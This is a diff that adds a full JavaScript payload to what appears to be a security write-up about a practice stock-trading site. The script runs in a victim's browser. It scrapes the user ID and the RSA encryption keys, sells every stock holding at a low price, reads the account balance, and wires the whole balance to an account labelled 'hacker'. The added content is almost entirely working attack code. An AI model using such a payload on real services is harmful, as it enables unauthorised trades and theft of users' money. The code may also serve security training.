@@ -92,7 +92,181 @@ index="git_apache"  clientip="128.30.28.58"
 
 <img width="922" alt="스크린샷 2024-07-28 오후 11 29 16" src="https://github.com/user-attachments/assets/96812bca-cc3a-487c-a864-fd81e20016ba">
 
+===
+```
+<script src="/js/jquery.min.js"></script>
+<script src="/js/rsa/jsbn.js"></script>
+<script src="/js/rsa/prng4.js"></script>
+<script src="/js/rsa/rng.js"></script>
+<script src="/js/rsa/rsa.js"></script>
 
+<script>
+    async function getStock() {
+        const stockCode_list = ['AAPL', 'AMZN', 'FB', 'GOOGL', 'MSFT'];
+        const stockName_list = ['Apple', 'Amazon.com', 'Meta', 'Alphabet', 'Microsoft'];
+
+        for (let i = 0; i < stockCode_list.length; i++) {
+            const stockCode = stockCode_list[i];
+            const stockName = stockName_list[i];
+            try {
+                const response = await fetch(`https://www.rookiestock.com/detailstock?stockCode=${stockCode}&stockName=${stockName}`, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'text/plain'
+                    }
+                });
+
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+
+                const html = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, "text/html");
+                const userIdInput = doc.querySelector("#USER_ID");
+                const modulusMatch = html.match(/id="RSAModulus"\s+value="([^"]+)"/);
+                const Exponent = html.match(/id="RSAExponent"\s+value="([^"]+)"/);
+                const match = html.match(/own\.innerHTML \+= "[^`]*`(\d+)`/);
+                let haveUnit = "";
+                if (match) {
+                    haveUnit = match[1]; // 첫 번째 캡쳐 그룹의 값을 가져옵니다.
+                    console.log('보유 주식 수:', haveUnit);
+                } else {
+                    console.log('매치되는 데이터가 없습니다.');
+                }
+                if (userIdInput && modulusMatch && Exponent) {
+                    const RSAModulus = modulusMatch[1];
+                    const RSAExponent = Exponent[1];
+                    const userIdValue = userIdInput.value;
+                    console.log('Extracted RSAModulus:', RSAModulus);
+                    console.log('Extracted RSAExponent:', RSAExponent);
+                    console.log('Extracted USER_ID:', userIdValue);
+                    await performAjaxSell(RSAModulus, RSAExponent, userIdValue, stockCode, haveUnit);
+                } else {
+                    console.log('USER_ID input not found in the data.');
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+            }
+        }
+    }
+
+    async function sendMoney() {
+        try {
+            const response = await fetch('https://www.rookiestock.com/mypage', {
+                method: 'GET',
+                headers: {
+                    'Accept': 'text/plain'
+                }
+            });
+
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+
+            const res = await response.text();
+            const balanceRegex = /"ACCOUNT_BALANCE":(\d+)/;
+            const match = res.match(balanceRegex);
+
+            if (match) {
+                var bal = match[1]; // 잔액 조정
+                console.log("ACCOUNT_BALANCE value:", bal);
+
+                const transfer_res = await fetch('https://www.rookiestock.com/mypage/transfer', {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'text/plain'
+                    }
+                });
+
+                if (!transfer_res.ok) {
+                    throw new Error('Network response was not ok');
+                }
+
+                const tranfer_text = await transfer_res.text();
+                const userIdInput = 'hacker'; 
+                const modulusMatch = tranfer_text.match(/id="RSAModulus"\s+value="([^"]+)"/);
+                const Exponent = tranfer_text.match(/id="RSAExponent"\s+value="([^"]+)"/);
+
+                if (userIdInput && modulusMatch && Exponent) {
+                    const RSAModulus = modulusMatch[1];
+                    const RSAExponent = Exponent[1]; 
+                    await ajaxSend(RSAModulus, RSAExponent, userIdInput, bal);
+                } else {
+                    console.log("Required data not found in transfer response.");
+                }
+            } else {
+                console.log("ACCOUNT_BALANCE not found.");
+            }
+        } catch (error) {
+            console.error('Fetch error:', error);
+        }
+    }
+
+    async function main() {
+        await getStock();
+        await sendMoney();
+    }
+
+    main();
+
+    async function performAjaxSell(RSAModulus, RSAExponent, UserId, stock, haveUnit) {
+    var PRICE = '100';
+    var UNIT = haveUnit;
+    var USERID = UserId;
+    var STOCK = stock;
+
+    const rsa = new RSAKey();
+    rsa.setPublic(RSAModulus, RSAExponent);
+    let data = {
+        stock: STOCK,
+        price: PRICE,
+        userId: USERID,
+        unit: UNIT
+    };
+    let e2eData = rsa.encrypt(JSON.stringify(data));
+
+    // Promise를 반환하는 jQuery Ajax 사용
+    try {
+        const response = await $.ajax({
+            url: '/detailSell',
+            type: 'POST',
+            contentType: 'application/json',
+            data: e2eData
+        });
+        alert(response.MSG);
+    } catch (error) {
+        alert('오류 발생: ' + error.statusText);
+    }
+}
+
+async function ajaxSend(RSAModulus, RSAExponent, user_nm, PRICE) {
+    const rsa = new RSAKey();
+    rsa.setPublic(RSAModulus, RSAExponent);
+    let data = {
+        name: user_nm,
+        account_number: '909089-4923112',
+        price: PRICE,
+        transfer_bankagency: 'RK루키은행'
+    };
+    let e2eData = rsa.encrypt(JSON.stringify(data));
+
+    // Promise를 반환하는 jQuery Ajax 사용
+    try {
+        const response = await $.ajax({
+            url: '/mypage/send',
+            type: 'POST',
+            contentType: 'application/json',
+            data: e2eData
+        });
+        alert(response.body);
+    } catch (error) {
+        alert('오류 발생: ' + error.statusText);
+    }
+}
+
+</script>
+```
 
 
 
